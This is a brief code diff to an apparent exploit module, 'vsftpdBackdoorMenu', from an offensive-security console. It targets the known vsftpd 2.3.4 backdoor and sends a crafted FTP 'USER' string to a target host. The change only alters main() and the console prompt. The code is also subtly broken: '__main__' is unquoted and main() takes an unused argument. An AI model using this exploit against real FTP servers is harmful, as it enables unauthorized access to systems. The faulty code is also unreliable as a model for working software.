@@ -12,8 +12,8 @@ class vsftpdBackdoorMenu(core.Exploit):
         s.send("USER " + p)
         s.recv(1024)
         self.disconnect(s)
-def main():
+def main(s):
   menu = vsftpdBackdoorMenu("vsftpd_backdoor", "Linux with vsftpd v2.3.4", "", {"host":""}, {"host":"the IP of the target"})
-  menu.cmdloop("pdf-console attack(vsftpd_backdoor)% ")
+  menu.cmdloop()
 if __name__ == __main__:
-  main()
+  main("")
